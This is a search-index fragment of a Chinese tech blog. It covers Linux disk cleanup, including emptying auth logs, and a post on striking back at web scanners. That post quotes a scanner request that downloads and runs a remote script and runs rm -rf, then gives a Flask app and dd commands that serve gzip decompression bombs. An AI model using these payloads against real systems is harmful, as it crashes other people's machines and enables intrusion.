<p>\u8fd9\u4e24\u4e2a\u64cd\u4f5c\u53ea\u662f\u4e00\u6b21\u6027\u6e05\u9664\u65e5\u5fd7\uff0c\u5e76\u4e0d\u80fd\u9650\u5236\u4ee5\u540e\u7684\u65e5\u5fd7\u6587\u4ef6\u4e0d\u4f1a\u8d85\u8fc7\u8fd9\u4e2a\u5927\u5c0f\u3002\u5f88\u591a\u535a\u5ba2\u91cc\u8bf4\u8fd9\u4e24\u4e2a\u64cd\u4f5c\u53ef\u4ee5\u9650\u5236\u65e5\u5fd7\u6587\u4ef6\u7684\u5927\u5c0f\uff0c\u5c5e\u5b9e\u662f\u8bef\u5bfc\u4eba\u3002</p> <p>\u5982\u679c\u9700\u8981\u6c38\u4e45\u9650\u5236\u65e5\u5fd7\u6587\u4ef6\u7684\u5927\u5c0f\uff0c\u9700\u8981\u4fee\u6539 <code>/etc/systemd/journald.conf</code> \u6587\u4ef6\u3002</p> <ul> <li> <p>\u6c38\u4e45\u9650\u5236 journal \u65e5\u5fd7\u7684\u5927\u5c0f\uff1a</p> journald.conf<pre><code>[Journal]\nSystemMaxUse=10M   # \u786c\u76d8\u4e2d\u53ea\u4fdd\u7559\u6700\u8fd1 10M \u7684\u65e5\u5fd7\nRuntimeMaxUse=10M  # \u5185\u5b58\u4e2d\u53ea\u4fdd\u7559\u6700\u8fd1 10M \u7684\u65e5\u5fd7\n</code></pre> </li> <li> <p>\u4e0d\u4fdd\u7559\u65e5\u5fd7</p> journald.conf<pre><code>[Journal]\nStorage=none       # \u4e22\u5f03\u6240\u6709\u7684\u65e5\u5fd7\uff0c\u4e0d\u4fdd\u5b58\u5230\u5185\u5b58\u6216\u78c1\u76d8\n</code></pre> </li> </ul> <p>\u5371\u9669</p> <p>\u4e0d\u8981\u4f7f\u7528 <code>rm</code> \u547d\u4ee4\u6765\u5220\u9664 journal \u65e5\u5fd7\u3002\u53c2\u8003 \u5220\u9664\u65e5\u5fd7\u91ca\u653e\u7a7a\u95f4\u6700\u597d\u4e0d\u8981\u7528rm</p>","tags":["linux"]},{"location":"blog/2022/220417-linux-clean-up-disk-space/#apt-get","title":"\u6e05\u7406 apt-get \u7f13\u5b58","text":"<p>\u4e00\u822c\u53ef\u4ee5\u6e05\u7406\u6570\u767e MB\u3002</p> <pre><code>apt-get clean\n</code></pre>","tags":["linux"]},{"location":"blog/2022/220417-linux-clean-up-disk-space/#pip","title":"\u6e05\u7406 pip \u7f13\u5b58","text":"<p>\u4e00\u822c\u53ef\u4ee5\u6e05\u7406\u4e24\u4e09\u767e MB\u3002</p> <pre><code>rm -r ~/.cache/pip\n</code></pre>","tags":["linux"]},{"location":"blog/2022/220417-linux-clean-up-disk-space/#snap","title":"\u6e05\u7406\u65e7\u7248\u672c snap \u5305","text":"<p>\u4e00\u822c\u6bcf\u4e2a\u65e7\u7684 snap \u5305\u53ef\u4ee5\u6e05\u7406 100 MB\u3002</p> <ul> <li> <p>\u5217\u51fa\u6240\u6709\u7684 snap \u5305\uff1a</p> <pre><code>snap list --all\n</code></pre> <p>\u53ef\u4ee5\u89c1\u5230\u5f88\u591a\u6807\u8bb0\u4e3a <code>disabled</code> \u7684 snap \u5305\uff0c\u8fd9\u4e9b\u5305\u662f\u53ef\u4ee5\u76f4\u63a5\u5378\u8f7d\u7684\u3002</p> <pre><code>Name     Version    Rev    Tracking       Publisher     Notes\ncertbot  1.26.0     1952   latest/stable  certbot-eff\u2713  classic\ncmake    3.23.0     1070   latest/stable  crascit\u2713      disabled,classic\ncmake    3.23.1     1082   latest/stable  crascit\u2713      classic\ncore     16-2.55.2  12941  latest/stable  canonical\u2713    core,disabled\ncore     16-2.54.4  12834  latest/stable  canonical\u2713    core\ncore18   20220309   2344   latest/stable  canonical\u2713    base\ncore20   20220318   1405   latest/stable  canonical\u2713    base\n</code></pre> </li> <li> <p>\u5220\u9664\u8fd9\u4e9b\u91cd\u590d\u7684 snap \u5305\uff1a</p> <pre><code>snap remove XXXX --revision YYYY   # XXXX \u662f\u8f6f\u4ef6\u7684 name\uff0cYYYY \u662f\u8f6f\u4ef6\u7684 Rev\n</code></pre> </li> <li> <p>\u4e5f\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u811a\u672c\u6e05\u9664\uff1a</p> <p>\u6765\u81ea How to Clean Up Snap Package Versions in Linux</p> <pre><code>#!/bin/bash\n# Removes old revisions of snaps\n# CLOSE ALL SNAPS BEFORE RUNNING THIS\nset -eu\nsnap list --all | awk '/disabled/{print $1, $3}' |\nwhile read snapname revision; do\nsnap remove \"$snapname\" --revision=\"$revision\"\ndone\n</code></pre> </li> </ul>","tags":["linux"]},{"location":"blog/2022/220417-linux-clean-up-disk-space/#_1","title":"\u6e05\u7406\u767b\u5f55\u65e5\u5fd7","text":"<p>\u8fd9\u4e2a\u6587\u4ef6\u662f\u8bb0\u5f55\u9519\u8bef\u767b\u5f55\u7684\u65e5\u5fd7\uff0c\u5982\u679c\u6709\u4eba\u6bcf\u5929\u8bd5\u4f60\u7684\u5bc6\u7801\u6765\u66b4\u529b\u7834\u89e3\u4f60\u7684 ssh\uff0c\u90a3\u4f60\u7684\u8fd9\u4e2a\u6587\u4ef6\u5c31\u4f1a\u5f88\u5927\u3002</p> <pre><code>echo \"\" &gt; /var/log/btmp\n</code></pre> <p>\u8be5\u6587\u4ef6\u540c\u7406</p> <pre><code>echo \"\" &gt; /var/log/auth.log\n</code></pre> <p>\u540c\u7406\uff0c\u4e0d\u5e94\u5f53\u4f7f\u7528 <code>rm</code> \u800c\u662f\u4f7f\u7528 <code>echo</code> \u6765\u6e05\u7a7a\u8fd9\u4e24\u4e2a\u65e5\u5fd7\u3002</p>","tags":["linux"]},{"location":"blog/2022/220421-use-gzip-bomb-against-scanner/","title":"\u5982\u4f55\u4f7f\u7528 gzip \u538b\u7f29\u5305\u70b8\u5f39\u5bf9\u6076\u610f\u626b\u63cf\u5668\u8fdb\u884c\u53cd\u51fb","text":"","tags":["nginx","gzip-bomb","flask"]},{"location":"blog/2022/220421-use-gzip-bomb-against-scanner/#_1","title":"\u8d77\u56e0","text":"<pre><code>cat /var/log/nginx/error.log\n</code></pre> <p>\u7136\u540e\u53d1\u73b0 nginx \u65e5\u5fd7\u91cc\u5168\u662f\u626b\u63cf\u5668\u7684 404\uff0c\u8ba9\u6211\u4eec\u653e\u4e24\u4e2a\u4e0a\u6765\u5c55\u793a\u4e00\u4e0b\uff1a</p> <pre><code>2022/04/21 06:45:30 [error] 3281302#3281302: *239 open() \"/usr/share/nginx/html/GponForm/diag_Form\" failed (2: No such file or directory), client: XXX.XXX.XXX.XXX, server: localhost, request: \"POST /GponForm/diag_Form?images/ HTTP/1.1\", host: \"XXX.XXX.XXX.XXX\"\n2022/04/21 20:36:23 [error] 3281302#3281302: *1497 open() \"/usr/share/nginx/html/shell\" failed (2: No such file or directory), client: XXX.XXX.XXX.XXX, server: localhost, request: \"GET /shell?cd+/tmp;rm+-rf+*;wget+ tigoinari.tk/jaws;sh+/tmp/jaws HTTP/1.1\", host: \"XXX.XXX.XXX.XXX\"\n</code></pre> <p>\u5f88\u70e6\uff0c\u4e00\u5806\u626b\u63cf\u5668\u5728\u626b\u6211\u7684\u914d\u7f6e\uff0c\u53e6\u4e00\u5806\u626b\u63cf\u5668\u5728\u5e2e\u6211\u8c03\u7528 nginx \u7684 shell \u6765 <code>rm -rf *</code>\uff0c\u8fd8\u6709\u4e00\u5806\u626b\u63cf\u5668\u5728\u5e2e\u6211\u6267\u884c\u6076\u610f\u811a\u672c\u3002</p> <p>\u4e0d\u5f97\u4e0d\u8bf4\uff0c\u626b\u914d\u7f6e\u7684\u626b\u63cf\u5668\u867d\u7136\u6ca1\u4ec0\u4e48\u4f24\u5bb3\u529b\uff0c\u4f46\u662f\u5929\u5929\u7ed9 <code>error.log</code> \u52a0\u65e0\u610f\u4e49\u7684 log\uff0c\u672c\u8d28\u4e0a\u4e5f\u7b97\u662f\u4e00\u79cd\u9a9a\u6270\u4e86\u3002\u4f46\u662f\u6267\u884c\u811a\u672c\u7684\u6211\u771f\u7684\u770b\u4e0d\u4e0b\u53bb\u4e86\uff0c\u800c\u4e14\u4e07\u4e00\u54ea\u5929\u51fa\u4e86\u4e2a\u67d0\u67d0\u6f0f\u6d1e\uff0c\u7136\u540e\u771f\u6267\u884c\u6210\u529f\u4e86\u5462\uff0c\u770b\u6765\u5f97\u7528\u70b9\u624b\u6bb5\u5904\u7406\u6389\u3002</p>","tags":["nginx","gzip-bomb","flask"]},{"location":"blog/2022/220421-use-gzip-bomb-against-scanner/#_2","title":"\u6e29\u548c\u7684\u5904\u7406\u65b9\u6cd5","text":"<p>\u6076\u610f\u626b\u63cf\u5668\u626b\u7f51\u7ad9\uff0c\u6839\u636e\u65e5\u5fd7\u4e2d\u663e\u793a\u7684 <code>host</code> \u7684\u503c\u53ef\u4ee5\u5206\u4e3a\u4e09\u4e2a\u60c5\u51b5\uff1a</p> <ul> <li><code>host</code> \u662f\u81ea\u5df1\u7684\u516c\u7f51 IP\uff1a\u8bf4\u660e\u626b\u63cf\u5668\u5728\u516c\u7f51\u4e0a\u626b IP \u6bb5\uff0c\u5e76\u4e14\u901a\u8fc7 IP \u5730\u5740\u76f4\u63a5\u8bbf\u95ee\u4f60\u7684\u4e3b\u673a\u768480\u7aef\u53e3</li> <li><code>host</code> \u662f <code>127.0.0.1</code> \u6216 <code>localhost</code>\uff1a\u8bf4\u660e\u626b\u63cf\u5668\u626b\u7684\u662f\u4f60\u7684\u57df\u540d\uff0c\u5e76\u901a\u8fc7 nginx \u53cd\u4ee3\u5230\u4e86 <code>localhost</code></li> <li><code>host</code> \u662f\u4f60\u7684\u57df\u540d\uff1a\u8bf4\u660e\u626b\u63cf\u5668\u722c\u7684\u662f\u4f60\u7684\u57df\u540d</li> </ul> <p>\u540e\u4e24\u79cd\u60c5\u51b5\u53ef\u4ee5\u4ea4\u7ed9 Cloudflare \u89e3\u51b3\uff0c\u628a\u5b89\u5168\u6027\u9762\u677f\u4e0a\u7684 <code>\u6258\u7ba1\u89c4\u5219</code> \u6253\u5f00\u5c31\u884c\uff08\u53ef\u60dc\u73b0\u5728\u6682\u65f6\u8fd8\u7528\u4e0d\u4e86\uff0c\u5f97\u7b49 cf \u4e0a\u7ebf\uff09\u3002</p> <p>\u8f7b\u677e\u914d\u7f6e\u548c\u90e8\u7f72 Cloudflare \u51ed\u501f\u4fdd\u62a4\u6570\u767e\u4e07\u4e2a\u5e94\u7528\u7a0b\u5e8f\u7684\u7ecf\u9a8c\u6784\u5efa\u7684\u89c4\u5219\u3002Cloudflare \u514d\u8d39\u6258\u7ba1\u89c4\u5219\u96c6\u5373\u5c06\u4e0a\u7ebf\uff01 https://blog.cloudflare.com/waf-for-everyone/</p> <p>\uff08\u6572\u7897\u7b49 cf \u4e0a\u7ebf\u514d\u8d39\u6258\u7ba1\u89c4\u5219\u96c6\uff09</p> <p>\u672c\u6587\u7740\u91cd\u8ba8\u8bba\u7b2c\u4e00\u79cd\u60c5\u51b5\u3002\u7b2c\u4e00\u79cd\u60c5\u51b5\u53ef\u4ee5\u4f7f nginx \u963b\u6b62\u6240\u6709\u7684\u901a\u8fc7 IP \u5730\u5740\u76f4\u63a5\u8bbf\u95ee80\u7aef\u53e3\u7684\u8bf7\u6c42\uff0c\u5177\u4f53\u8bbe\u7f6e\u5982\u4e0b\uff1a</p> nginx.conf\uff08\u90e8\u5206\uff09<pre><code>server {\nlisten 80 default_server;\nlisten [::]:80 default_server;\nserver_name _;\nreturn 403;\n}\n\nserver {\nlisten 80;\nlisten [::]:80;\nserver_name localhost 127.0.0.1;\n...\n}\n</code></pre> <p>nginx \u7684 <code>default_server</code> \u6307\u4ee4\u53ef\u4ee5\u5b9a\u4e49\u9ed8\u8ba4\u7684 <code>server</code> \u53bb\u5904\u7406\u4e00\u4e9b\u6ca1\u6709\u5339\u914d\u5230 <code>server_name</code> \u7684\u8bf7\u6c42\uff0c\u5982\u679c\u6ca1\u6709\u663e\u5f0f\u5b9a\u4e49\uff0c\u5219\u4f1a\u9009\u53d6\u7b2c\u4e00\u4e2a\u5b9a\u4e49\u7684 <code>server</code> \u4f5c\u4e3a <code>default_server</code>\u3002\uff08\u89c1 nginx \u7684 default_server \u5b9a\u4e49\u53ca\u5339\u914d\u89c4\u5219 \uff09</p> <p>\u8fd9\u91cc\u6211\u4eec\u663e\u5f0f\u5b9a\u4e49\u4e00\u4e2a <code>default_server</code>\uff0c\u5176 <code>server_name</code> \u968f\u4fbf\u53d6\uff0c\u53d6\u4ec0\u4e48\u503c\u90fd\u6ca1\u6709\u5173\u7cfb\uff0c\u8bf7\u6ce8\u610f\u4e0d\u8981\u548c\u5df2\u5b9a\u4e49\u7684 <code>server_name</code> \u91cd\u590d\uff0c\u6240\u4ee5\u4e00\u822c\u662f\u91c7\u7528 <code>_</code>\u3002</p> <p>\u73b0\u5728\uff0c\u6240\u6709\u672a\u88ab <code>server_name</code> \u5339\u914d\u5230\u7684\u8bf7\u6c42\uff08\u4e00\u822c\u6765\u8bf4\u5c31\u662f\u901a\u8fc7 IP \u5730\u5740\u76f4\u63a5\u8bbf\u95ee80\u7aef\u53e3\u7684\u8bf7\u6c42\uff09\u90fd\u4f1a\u88ab <code>default_server</code> \u5904\u7406\uff0c\u5e76\u4e14\u8fd4\u56de <code>403 Forbidden</code>\u3002</p> <p>\u7136\u540e\u6211\u4eec\u518d\u5728\u539f\u6709\u7684 <code>server_name localhost</code> \u7684\u57fa\u7840\u4e0a\u8865\u5145\u4e00\u4e2a <code>127.0.0.1</code>\uff0c\u5426\u5219\u6211\u4eec\u5728\u672c\u5730\u8fde\u63a5\u5230 <code>127.0.0.1:80</code> \u65f6\u4f1a\u5403\u5230\u81ea\u5df1\u8bbe\u4e0b\u7684 403\u3002</p> <p>\u8fd8\u6709\u8c01\u4f1a\u5403\u5230403</p> <p>\u4e00\u822c\u6765\u8bf4\uff0c\u8fd9\u4e2a\u65b9\u6848\u662f\u4e3a\u4e86\u6355\u83b7\u901a\u8fc7\u6211\u4eec\u670d\u52a1\u5668\u7684\u516c\u7f51 IP \u5730\u5740\u76f4\u63a5\u8bbf\u95ee80\u7aef\u53e3\u7684\u8bf7\u6c42\uff0c\u4f46\u662f\u8fd8\u6709\u4ee5\u4e0b\u51e0\u79cd\u60c5\u51b5\u4e5f\u4f1a\u88ab <code>default_server</code> \u6355\u83b7\uff1a</p> <ul> <li>\u6211\u4eec\u90e8\u7f72\u4e86\u4e00\u4e2a\u6b63\u5e38\u7684 http \u670d\u52a1\uff0c\u5e76\u4e14\u5728 DNS \u4e0a\u8bbe\u7f6e\u4e86\u5230\u81ea\u5df1\u670d\u52a1\u5668\u7684 <code>A/AAAA/CNAME</code> \u8bb0\u5f55\uff0c\u4f46\u662f\u5374\u5fd8\u8bb0\u5728 nginx \u4e2d\u5c06\u8bb0\u5f55\u503c\uff08\u57df\u540d\uff09\u8bbe\u7f6e\u6210 <code>server_name</code> \u4e86\u3002</li> <li>\u6211\u4eec\u5728 DNS \u4e0a\u8bbe\u7f6e\u4e86\u5230\u81ea\u5df1\u670d\u52a1\u5668\u7684 <code>A/AAAA/CNAME</code> \u8bb0\u5f55\uff0c\u4f46\u662f\u8fd9\u4e2a\u57df\u540d\u5bf9\u5e94\u7684\u670d\u52a1\u5e76\u4e0d\u662f http \u670d\u52a1\uff08\u4f8b\u5982 sql\u3001ftp \u7b49\uff09\uff0c\u5e76\u4e14\u76d1\u542c\u7aef\u53e3\u4e5f\u4e0d\u662f80\uff0c\u4f46\u5f88\u78b0\u5de7\uff0c\u6709\u4eba\u6b63\u8bd5\u56fe\u901a\u8fc780\u7aef\u53e3\u8bbf\u95ee\u8fd9\u4e2a\u57df\u540d\u3002</li> <li>\u6709\u4eba\u5c06\u4ed6\u81ea\u5df1\u7684\u57df\u540d\u6076\u610f\u89e3\u6790\u5230\u6211\u4eec\u7684\u670d\u52a1\u5668\u4e0a\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\u65e5\u5fd7\u4e2d\u7684 <code>host</code> \u503c\u5c06\u4f1a\u663e\u793a\u4ed6\u7684\u57df\u540d\u3002</li> </ul>","tags":["nginx","gzip-bomb","flask"]},{"location":"blog/2022/220421-use-gzip-bomb-against-scanner/#_3","title":"\u72e0\u4e00\u70b9\u7684\u5904\u7406\u65b9\u6cd5\uff08\u672c\u756a\uff09","text":"<p>\u8fd9\u91cc\u662f\u672c\u756a\uff0c\u4e3b\u8981\u4ecb\u7ecd\u5982\u4f55\u7528 gzip \u538b\u7f29\u5305\u70b8\u5f39\u5bf9\u6076\u610f\u626b\u63cf\u5668\u8fdb\u884c\u53cd\u51fb\u3002</p>","tags":["nginx","gzip-bomb","flask"]},{"location":"blog/2022/220421-use-gzip-bomb-against-scanner/#_4","title":"\u4ec0\u4e48\u662f\u538b\u7f29\u5305\u70b8\u5f39","text":"<p>\u9996\u5148\u7b80\u8981\u4ecb\u7ecd\u4e0b\u4ec0\u4e48\u662f\u538b\u7f29\u5305\u70b8\u5f39\uff08\u4e5f\u53eb zip \u70b8\u5f39\uff09\uff1a</p> <p>\u4ec0\u4e48\u662f\u538b\u7f29\u5305\u70b8\u5f39</p> <p>\u4e00\u4e2a zip \u70b8\u5f39\u901a\u5e38\u662f\u4e00\u4e2a\u5c0f\u6587\u4ef6\uff0c\u4fbf\u4e8e\u4f20\u8f93\u4e5f\u907f\u514d\u88ab\u6000\u7591\u3002\u4f46\u662f\uff0c\u89e3\u538b\u7f29\u6587\u4ef6\u65f6\uff0c\u5b83\u7684\u5185\u5bb9\u5c31\u4f1a\u8d85\u51fa\u7cfb\u7edf\u7684\u5904\u7406\u80fd\u529b\u3002zip \u70b8\u5f39\u4e0d\u4f1a\u963b\u6b62\u7a0b\u5e8f\u7684\u6b63\u5e38\u8fd0\u884c\uff0c\u800c\u662f\u8ba9\u7a0b\u5e8f\u5de5\u4f5c\uff0c\u4f46\u662f\u6587\u4ef6\u91cc\u7684\u6863\u6848\u662f\u7cbe\u5fc3\u8bbe\u8ba1\u7684\uff0c\u56e0\u6b64\u8981\u89e3\u538b\u7f29\u6587\u4ef6\u65f6\uff08\u6bd4\u5982\u7528\u75c5\u6bd2\u626b\u63cf\u7a0b\u5e8f\u6765\u7ed9\u5b83\u626b\u63cf\u75c5\u6bd2\uff09\uff0c\u5c31\u9700\u8981\u82b1\u8d39\u5927\u91cf\u65f6\u95f4\u3001\u78c1\u76d8\u7a7a\u95f4\u548c\u5185\u5b58\u3002 \u7ef4\u57fa\u767e\u79d1</p> <p>\u4e5f\u5c31\u662f\u8bf4\u5c0f\u5c0f\u7684\u51e0\u5341 KB \u7684\u538b\u7f29\u5305\u53ef\u4ee5\u89e3\u538b\u51fa\u6570 GB \u7684\u6570\u636e\uff0c\u518d\u5927\u4e00\u70b9\u7684\u538b\u7f29\u5305\u751a\u81f3\u53ef\u4ee5\u89e3\u538b\u51fa\u51e0 TB \u751a\u81f3\u51e0 PB \u7684\u6570\u636e\u3002</p> <p>\u5982\u679c\u5c1d\u8bd5\u5c06\u8fd9\u4e9b\u6570\u636e\u89e3\u538b\u5728\u786c\u76d8\u91cc\uff0c\u5219\u4f1a\u5bfc\u81f4\u786c\u76d8 IO \u76f4\u63a5100%\uff1b\u5982\u679c\u5c1d\u8bd5\u5c06\u8fd9\u4e9b\u6570\u636e\u89e3\u538b\u5230\u5185\u5b58\u4e2d\uff0c\u4f1a\u5bfc\u81f4\u5185\u5b58\u5360\u7528\u7387\u4e0d\u65ad\u4e0a\u5347\uff0c\u76f4\u5230 OOM\u3002</p>","tags":["nginx","gzip-bomb","flask"]},{"location":"blog/2022/220421-use-gzip-bomb-against-scanner/#gzip","title":"gzip \u538b\u7f29\u5305\u70b8\u5f39\u5982\u4f55\u5de5\u4f5c","text":"<p>\u73b0\u4ee3\u6d4f\u89c8\u5668\u4e2d\uff08\u5f53\u7136\u4e5f\u5305\u62ec\u5404\u4e2a\u8bed\u8a00\u7684\u7f51\u7edc\u8bf7\u6c42\u5e93\uff0c\u4f8b\u5982 python \u7684 <code>requests</code>\uff09\u901a\u5e38\u90fd\u53ef\u4ee5\u5904\u7406\u4ee5 gzip \u65b9\u5f0f\u538b\u7f29\u7684 html \u54cd\u5e94\uff08\u8f7d\u8377\uff09\u3002</p> <p>\u8bbe\u60f3\u4e00\u4e2a\u626b\u63cf\u5668\uff0c\u4ed6\u5c1d\u8bd5\u901a\u8fc7\u4f60\u7684\u516c\u7f51 IP \u626b\u63cf\u4f60\u7684\u670d\u52a1\u5668\uff0c\u6211\u4eec\u4ece\u67d0\u4e9b\u65b9\u5f0f\u4e86\u89e3\u5230\u8fd9\u662f\u4e00\u4e2a\u626b\u63cf\u5668\u540e\uff0c\u6545\u610f\u8fd4\u56de\u4e00\u4e2a\u4ee5 gzip \u65b9\u5f0f\u538b\u7f29\u7684 html \u54cd\u5e94\uff0c\u4f46\u662f\u8fd9\u4e2a\u54cd\u5e94\u5728\u89e3\u538b\u51fa\u6765\u4e4b\u540e\u6709\u8db3\u8db3\u6570 GB\uff0c\u4f1a\u600e\u4e48\u6837\uff1f</p> <p>\u6ca1\u9519\uff0c\u8fd9\u4e2a\u53ef\u601c\u800c\u611a\u8822\u7684\u626b\u63cf\u5668\u4f1a\u8bd5\u56fe\u89e3\u538b\u8fd9\u4e2a\u8f7d\u8377\uff0c\u968f\u540e\uff0c\u4ed6\u5185\u5b58\u5c06\u4f1a\u88ab\u6570 GB \u7684\u5783\u573e\u6240\u586b\u6ee1\uff0c\u7136\u540e OOM\u3002</p> <p>\u8fd9\u5c31\u662f\u6211\u4eec\u60f3\u8981\u8fbe\u5230\u7684\u6548\u679c\u2014\u2014\u4f7f\u7528 gzip \u538b\u7f29\u5305\u70b8\u5f39\u53cd\u51fb\u6076\u610f\u626b\u63cf\u5668\u3002</p>","tags":["nginx","gzip-bomb","flask"]},{"location":"blog/2022/220421-use-gzip-bomb-against-scanner/#_5","title":"\u5236\u9020\u5e76\u90e8\u7f72\u5728\u672c\u5730","text":"<p>\u4e3a\u4e86\u6d4b\u8bd5\uff0c\u9996\u5148\u5236\u9020\u4e00\u4e2a\u4ec5\u5305\u542b <code>test</code> \u4e3a\u5185\u5bb9\u7684\u538b\u7f29\u6587\u4ef6\u4f5c\u4e3a\u8f7d\u8377\uff1a</p> <pre><code>echo \"test\" | gzip &gt; test.gzip\n</code></pre> <p>\u6211\u4eec\u90e8\u7f72\u4e00\u4e2a\u7b80\u6613\u7684 Flask \u670d\u52a1\u5668\uff0c\u5e76\u8ba9\u5176\u5c06\u6211\u4eec\u5728\u4e0a\u6587\u5236\u9020\u7684 <code>test.gzip</code> \u4f5c\u4e3a\u538b\u7f29\u540e\u7684\u54cd\u5e94\uff1a</p> app.py<pre><code>from flask import Flask, Response, request\nimport logging\n\napp = Flask(__name__)\n\n\n@app.route('/', defaults={'path': ''})\n@app.route('/&lt;path:path&gt;')\ndef send_gzip_bomb(path):\nremote_addr = request.headers.get('X-Forwarded-For', request.remote_addr)\napp.logger.info(f'client [{remote_addr}] {request.method} [{request.host}] as {request.url}')\n    app.logger.info(f'User-Agent: {request.headers.get(\"User-Agent\")}')\n\n    with open(r'static/test.gzip', 'rb') as payload_gzip:\n        resp = payload_gzip.read()\nfinal_response = Response(response=resp, status=200, mimetype='text/html')\nfinal_response.headers['Content-Encoding'] = 'gzip'\nreturn final_response\n\n\nif __name__ == '__main__':\nlogging.basicConfig(filename='flask.log', level=logging.INFO)\napp.run(host='127.0.0.1', port=8082)\n</code></pre> <p>\u8fd9\u4e2a\u7b80\u6613\u7684 Flask \u670d\u52a1\u5668\u7684\u4ee3\u7801\u4e2d\u6709\u4ee5\u4e0b\u8981\u70b9\uff1a</p> <ul> <li>\u7b2c7\u884c - <code>@app.route('/', defaults={'path': ''})</code>\uff1a\u5f53\u5339\u914d\u5230 <code>'/'</code> \u7684\u8def\u7531\u65f6\uff08\u6bd4\u5982\u76f4\u63a5\u8bbf\u95ee <code>http://</code> + <code>\u4f60\u7684\u516c\u7f51 IP \u5730\u5740</code>\uff09\uff0c\u5c06 <code>send_gzip_bomb</code> \u51fd\u6570\u7684 <code>path</code> \u53c2\u6570\u8bbe\u7f6e\u6210 <code>''</code></li> <li>\u7b2c8\u884c - <code>@app.route('/&lt;path:path&gt;'))</code>\uff1a\u5f53\u5339\u914d\u5230\u4efb\u4f55\u5e26 path \u7684\u8def\u7531\u65f6\uff0c\u5c06 <code>send_gzip_bomb</code> \u51fd\u6570\u7684 <code>path</code> \u53c2\u6570\u8bbe\u7f6e\u6210 URL \u4e2d\u7684 path \u503c</li> </ul> <p>\u5982\u6b64\u4e00\u6765\uff0c\u8fd9\u4e2a <code>send_gzip_bomb</code> \u51fd\u6570\u4fbf\u80fd\u6355\u83b7\u6240\u6709\u7684\u8def\u7531\uff08\u5373\u4f7f\u51fd\u6570\u4e2d\u4ece\u672a\u4f7f\u7528 <code>path</code> \u53c2\u6570\uff09\u3002</p> <ul> <li>\u7b2c10\u884c - <code>'X-Forwarded-For'</code>\uff1a\u53d6\u51fa\u8bf7\u6c42\u5934\u4e2d\u7684 <code>X-Forwarded-For</code> \u7684\u503c\uff0c\u4ece\u800c\u77e5\u9053\u662f\u8c01\u8bbf\u95ee\u4e86\u6211\u4eec\u7684\u670d\u52a1\u5668\u3002\u5982\u679c\u76f4\u63a5\u4f7f\u7528 <code>request.remote_addr</code>\uff0c\u90a3\u4e48\u67e5\u770b\u5230\u7684\u5730\u5740\u6c38\u8fdc\u90fd\u662f <code>127.0.0.1</code>\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u8bf7\u6c42\u662f\u4ece\u672c\u5730\u7684 nginx \u53d1\u6765\u7684</li> </ul> <p>\u63d0\u793a</p> <p>\u4f7f\u7528 <code>X-Real-IP</code> \u66ff\u4ee3 <code>X-Forwarded-For</code> \u540c\u6837\u4e5f\u53ef\u4ee5\uff0c\u524d\u63d0\u662f\u8fd9\u4e24\u4e2a\u503c\u5728 nginx \u53cd\u4ee3\u65f6\u5df2\u7ecf\u88ab\u5b9a\u4e49\u3002\u89c1 \u90e8\u7f72\u4e8e nginx</p> <ul> <li>\u7b2c16\u884c - <code>mimetype='text/html'</code>\uff1a\u5728\u54cd\u5e94\u5934\u4e2d\u6307\u5b9a\u54cd\u5e94\u7c7b\u578b\u4e3a\u6587\u672c\uff0c\u8fd9\u6837\u88ab\u5bb3\u7684\u626b\u63cf\u5668\u670d\u52a1\u5668\u4fbf\u4f1a\u65e0\u6761\u4ef6\u89e3\u538b\u6211\u4eec\u53d1\u6765\u7684\u8f7d\u8377</li> <li>\u7b2c17\u884c - <code>final_response.headers['Content-Encoding'] = 'gzip'</code>\uff1a\u540c\u4e0a\uff0c\u544a\u77e5\u88ab\u5bb3\u7684\u626b\u63cf\u5668\u670d\u52a1\u5668\u4f7f\u7528 <code>gzip</code> \u89e3\u538b\u8f7d\u8377</li> <li>\u7b2c22\u884c - <code>filename='flask.log'</code>\uff1a\u5c06 Flask \u7684\u65e5\u5fd7\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u6587\u4ef6\uff0c\u65b9\u4fbf\u6211\u4eec\u8bb0\u5f55\u662f\u8c01\u6076\u610f\u8bbf\u95ee\u4e86\u6211\u4eec\u7684\u670d\u52a1\u5668</li> </ul> <p>\u73b0\u5728\uff0c\u8fd0\u884c\u8fd9\u4e2a Flask \u670d\u52a1\u5668\uff0c\u5e76\u8bbf\u95ee http://127.0.0.1:8082\u3002</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u6d4f\u89c8\u5668\u6210\u529f\u8fd8\u539f\u4e86 <code>test</code> \u7684\u6587\u672c\u5185\u5bb9\u3002</p> <p>\u73b0\u5728\uff0c\u6211\u4eec\u5236\u4f5c\u4e00\u4e9b\u9ad8\u538b\u7f29\u7387\u7684\u8f7d\u8377\u3002</p> <pre><code>dd if=/dev/zero bs=1M count=1024 | gzip &gt; 1G.gzip\ndd if=/dev/zero bs=1M count=10240 | gzip &gt; 10G.gzip\n</code></pre> <p>\u53d7\u5236\u4e8e DEFLATE \u7684\u6781\u9650\u538b\u7f29\u7387\uff0c\u4e0a\u8ff0\u4e24\u4e2a\u6587\u4ef6\u6700\u591a\u80fd\u88ab\u538b\u7f29\u5230\u5176\u539f\u6765\u5927\u5c0f\u7684\u7ea6 1/1000\u3002\u5373\u7ea6 1 MB \u7684 <code>1G.gzip</code> \u548c \u7ea6 10 MB \u7684 <code>10G.gzip</code>\u3002</p> <p>\u7136\u540e\u518d\u8bbf\u95ee\u4e00\u6b21 http://127.0.0.1:8082\u3002</p> <p></p> <p>\u53ef\u4ee5\u89c1\u5230\u5185\u5b58\u5360\u7528\u6b63\u5728\u4e0d\u65ad\u4e0a\u6da8\uff0c\u56e0\u4e3a\u6211\u6015\u6211\u7535\u8111 OOM \u6240\u4ee5\u5c31\u6ca1\u6709\u7ee7\u7eed\u6d4b\u8bd5\u4e0b\u53bb\u4e86\u3002</p>","tags":["nginx","gzip-bomb","flask"]},{"location":"blog/2022/220421-use-gzip-bomb-against-scanner/#nginx","title":"\u90e8\u7f72\u4e8e nginx","text":"<p>\u73b0\u5728\uff0c\u6211\u4eec\u9700\u8981\u5c06\u5176\u90e8\u7f72\u5230\u6211\u4eec\u7684\u670d\u52a1\u5668\u4e0a\uff0c\u8fd9\u6837\u624d\u80fd\u5c06\u5176\u4f5c\u4e3a\u53cd\u51fb\u5de5\u5177\u4f7f\u7528\u3002</p> <p>\u4fee\u6539\u5148\u524d\u63d0\u5230\u7684 nginx \u7684\u914d\u7f6e\uff1a</p> 